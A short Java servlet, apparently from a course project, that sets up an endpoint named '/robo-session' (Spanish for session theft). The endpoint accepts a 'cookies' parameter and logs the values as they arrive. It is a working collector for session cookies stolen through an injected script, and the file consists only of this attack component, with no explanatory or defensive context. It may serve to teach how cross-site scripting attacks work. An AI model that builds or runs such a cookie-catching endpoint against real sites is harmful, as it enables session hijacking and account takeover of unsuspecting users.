package com.curso.controllers;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/robo-session")
public class RoboSession extends HttpServlet {

	public void doGet(HttpServletRequest req, HttpServletResponse resp) {
		String cookies = req.getParameter("cookies");
		System.out.println("[!] Cookies llegando: " + cookies);
	}
}
